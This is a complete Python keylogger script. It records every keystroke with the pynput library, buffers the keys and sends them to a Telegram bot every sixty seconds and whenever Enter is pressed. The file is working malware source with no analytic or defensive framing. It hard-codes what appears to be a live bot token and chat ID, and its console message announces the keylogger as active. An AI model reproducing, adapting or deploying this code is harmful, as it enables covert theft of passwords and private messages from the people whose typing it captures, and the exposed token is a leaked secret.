from pynput import keyboard
import requests
import time
import threading

# === CONFIGURATION - REPLACE THESE VALUES ===
BOT_TOKEN = "8346087012:AAGUFItHu3hRLJ4loxduUcteyJOoOzRrMkE"  # Example: "123456789:ABCdefGhIJKlmNoPQrstUvWXyz"
CHAT_ID = "7192294390"      # Example: "131933xxxx"
# ============================================

# Buffer to store keystrokes
keystroke_buffer = ""
# Interval to send data (in seconds)
SEND_INTERVAL = 60

def send_to_telegram(message):
    """Sends a message to the Telegram bot."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code != 200:
            print(f"Failed to send message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message: {e}")

def on_press(key):
    """Callback function that runs whenever a key is pressed."""
    global keystroke_buffer

    try:
        # Handle special keys
        if hasattr(key, 'char') and key.char is not None:
            keystroke_buffer += key.char
        else:
            # Format special keys with brackets
            key_name = str(key).replace("Key.", "[") + "]"
            keystroke_buffer += key_name

        # Optional: Send immediately when Enter is pressed
        if key == keyboard.Key.enter:
            keystroke_buffer += "\n"
            send_to_telegram(keystroke_buffer)
            keystroke_buffer = ""

    except AttributeError:
        # Handle any unexpected key attributes
        pass

def report():
    """Function to periodically send the keystroke buffer."""
    global keystroke_buffer
    if keystroke_buffer:
        send_to_telegram(keystroke_buffer)
        keystroke_buffer = ""
    # Set a timer to run this function again after the interval
    timer = threading.Timer(SEND_INTERVAL, report)
    timer.daemon = True
    timer.start()

# Start the periodic reporting
report()

# Start the keylogger listener
with keyboard.Listener(on_press=on_press) as listener:
    print("[+] Keylogger is now active. Press Ctrl+C to stop.")
    listener.join()